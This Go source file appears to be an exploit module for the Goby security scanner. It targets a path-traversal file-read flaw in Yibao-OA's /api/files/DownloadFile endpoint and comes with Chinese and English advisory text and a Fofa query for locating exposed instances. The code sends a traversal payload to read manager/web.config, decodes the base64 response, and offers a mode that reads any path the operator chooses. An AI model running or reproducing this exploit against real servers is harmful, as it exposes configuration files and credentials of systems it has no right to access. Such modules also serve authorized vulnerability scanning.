package exploits

import (
	"encoding/base64"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yibao-OA /api/files/DownloadFile File Read Vulnerability",
    "Description": "<p>Yibao-OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also allows everyone to record important matters here. At the same time, the software also has a better punching system, which allows users to quickly record their work frequently and shift. It will also be easier to refill the card, which will improve your work activity.</p><p>There is a file reading vulnerability under the Yibao-OA /api/files/DownloadFile path, through which the attacker can read important system files (such as database configuration file, system configuration file, database configuration file, database configuration file, etc., resulting in an extremely unsafe state of the website.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2024-06-19",
    "PostTime": "2024-06-19",
    "Author": "Town",
    "FofaQuery": "body=\"$.cookie(\\\"topvision_oaName\" && title=\"欢迎登录易宝OA系统\"",
    "GobyQuery": "body=\"$.cookie(\\\"topvision_oaName\" && title=\"欢迎登录易宝OA系统\"",
    "Level": "1",
    "Impact": "<p>There is a file reading vulnerability under the Yibao-OA /api/files/DownloadFile path, through which the attacker can read important system files (such as database configuration file, system configuration file, database configuration file, database configuration file, etc., resulting in an extremely unsafe state of the website.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability:<a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a> <a href=\"https://www.fastadmin.net/\"></a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.config,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.8",
    "Translation": {
        "CN": {
            "Name": "易宝OA /api/files/DownloadFile 文件读取漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA是一款非常强大的手机办公软件，这里不仅为广大的用户提供了一个更好的工作日历，而且每个人都可以在这里进行重要事项的记录，同时软件中还拥有更好的打卡系统，让用户可以快速记录自己的工作时常，而且调班与补卡也会更加的简单，让你工作活跃度得到提升。<br></p><p>易宝OA&nbsp;/api/files/DownloadFile 路径下存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>易宝OA /api/files/DownloadFile 路径下存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Yibao-OA /api/files/DownloadFile File Read Vulnerability",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>Yibao-OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also allows everyone to record important matters here. At the same time, the software also has a better punching system, which allows users to quickly record their work frequently and shift. It will also be easier to refill the card, which will improve your work activity.</p><p>There is a file reading vulnerability under the Yibao-OA /api/files/DownloadFile path, through which the attacker can read important system files (such as database configuration file, system configuration file, database configuration file, database configuration file, etc., resulting in an extremely unsafe state of the website.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability:<a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a> <a href=\"https://www.fastadmin.net/\"></a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>There is a file reading vulnerability under the Yibao-OA /api/files/DownloadFile path, through which the attacker can read important system files (such as database configuration file, system configuration file, database configuration file, database configuration file, etc., resulting in an extremely unsafe state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10962"
}`
	/*
	  "ExpParams": [
	    {
	      "name": "mode",
	      "type": "select",
	      "value": "默认读取的文件,Customize",
	      "show": ""
	    },
	    {
	      "name": "Customize",
	      "type": "input",
	      "value": "",
	      "show": "mode=Customize"
	    }
	  ],
	*/

	postOrGet_ppZfk7oLdsVKrI5EXh2d6R9Xtuak40RX := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/api/files/DownloadFile")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "token=zxh&requestFileName=" + fileUrl + "&pathType=1&startPosition=0&bufferSize=1000"
		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return "", err
		}
		respTxt := ""
		re := regexp.MustCompile(`"data":"([^"]+)"`)
		matches := re.FindStringSubmatch(resp.Utf8Html)
		if len(matches) > 1 {
			dataValue := matches[1]
			decodedBytes, err := base64.StdEncoding.DecodeString(dataValue)
			if err != nil {
				return "", err
			}
			respTxt = string(decodedBytes)
		} else {
			return "", nil
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/api/files/DownloadFile"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../manager/web.config": "<?xml version=",
			}
			// 函数继承
			uploadFileFunc := postOrGet_ppZfk7oLdsVKrI5EXh2d6R9Xtuak40RX

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.config": {"../../manager/web.config", "<?xml version="},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_ppZfk7oLdsVKrI5EXh2d6R9Xtuak40RX

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
